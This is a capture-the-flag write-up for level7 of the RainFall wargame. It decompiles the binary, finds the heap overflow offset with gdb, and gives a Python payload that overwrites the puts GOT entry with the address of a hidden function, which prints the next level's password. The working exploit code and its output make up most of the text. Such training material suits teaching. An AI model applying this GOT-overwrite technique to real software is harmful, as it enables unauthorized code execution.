# level7

Quick experimentation with the binary gives us :
```sh
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 a
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 a a
~~
level7@RainFall:~$ ./level7 a a a aa 
~~
level7@RainFall:~$ ./level7 a a a aa  a aa 
~~
```

The arguments seems important once again. Let's disassemble.

```c

int main(int argc, char** argv)
{
  char **puVar1;
  void *pvVar2;
  char **puVar3;
  FILE *__stream;
  
  puVar1 = (char **)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(argv + 4));
  strcpy((char *)puVar3[1],*(char **)(argv + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,68,__stream);
  puts("~~");
  return 0;
}
```

Note that the 68 first bytes of the file gets stored to `c`, which is a global variable.

However there's another function `m` that is never called.

```c
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  printf("%s - %d\n",c,tVar1); // <-- reads the global variable c
  return;
}
```

So there we might do the game trick as before, by overwriting the address of `puts` in the GOT with the address of `m`, printing the content of `c`.

Getting the offset using `gdb` & `gef` :
```sh
$ gdb level7
gef➤ pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤ r <pattern> <pattern>
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xf7ffcb80  →  0x00000000
$ebx   : 0xf7f93ff4  →  0x001e7d8c
$ecx   : 0x32      
$edx   : 0xf7f93ff4  →  0x001e7d8c
$esp   : 0xffffcb0c  →  0xf7e50751  →  <strcpy+49> add esp, 0x14
$ebp   : 0xffffcb58  →  0x00000000
$esi   : 0xffffce8d  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edi   : 0x61616166 ("faaa"?)
$eip   : 0xf7e4daae  →  <memcpy+94> movs BYTE PTR es:[edi], BYTE PTR ds:[esi]
$eflags: [zero CARRY parity ADJUST sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcb0c│+0x0000: 0xf7e50751  →  <strcpy+49> add esp, 0x14     ← $esp
0xffffcb10│+0x0004: 0x61616166
0xffffcb14│+0x0008: 0xffffce8d  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
0xffffcb18│+0x000c: 0x00000065 ("e"?)
0xffffcb1c│+0x0010: 0xf7e50720  →  <strcpy+0> endbr32 
0xffffcb20│+0x0014: 0x0804a1b0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
0xffffcb24│+0x0018: 0xf7f93ff4  →  0x001e7d8c
0xffffcb28│+0x001c: 0x08048610  →  <__libc_csu_init+0> push ebp
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7e4daa9 <memcpy+89>      ret    
   0xf7e4daaa <memcpy+90>      shr    ecx, 1
   0xf7e4daac <memcpy+92>      jae    0xf7e4daaf <memcpy+95>
 → 0xf7e4daae <memcpy+94>      movs   BYTE PTR es:[edi], BYTE PTR ds:[esi]
   0xf7e4daaf <memcpy+95>      shr    ecx, 1
   0xf7e4dab1 <memcpy+97>      jae    0xf7e4dab5 <memcpy+101>
   0xf7e4dab3 <memcpy+99>      movs   WORD PTR es:[edi], WORD PTR ds:[esi]
   0xf7e4dab5 <memcpy+101>     rep    movs DWORD PTR es:[edi], DWORD PTR ds:[esi]
   0xf7e4dab7 <memcpy+103>     jmp    0xf7e4daa1 <memcpy+81>
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "level7_bin", stopped 0xf7e4daae in memcpy (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7e4daae → memcpy()
[#1] 0xf7e50751 → strcpy()
[#2] 0x80485c2 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ pattern search 0x61616166
[+] Searching for '66616161'/'61616166' with period=4
[+] Found at offset 20 (little-endian search) likely
```

We need the address of `m` and the address

```sh
gef➤ p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
```

And the address of `puts` :
```sh
$ objdump -R level7
level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

And we can write our payload :

```python
import struct
import sys

M_ADDY   = 0x80484f4
PUTS_GOT = 0x8049928

if len(sys.argv) != 2:
    exit(1)

if sys.argv[1] == "1":
    payload = b'A' * 20
    payload += struct.pack('<I', PUTS_GOT)
elif sys.argv[1] == "2":
    payload = struct.pack('<I', M_ADDY)
else:
    exit(1)

print payload
```

And we can get the flag :

```sh
$ ./level7 $(python /tmp/payload.py 1) $(python /tmp/payload.py 2)
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1699466175
```
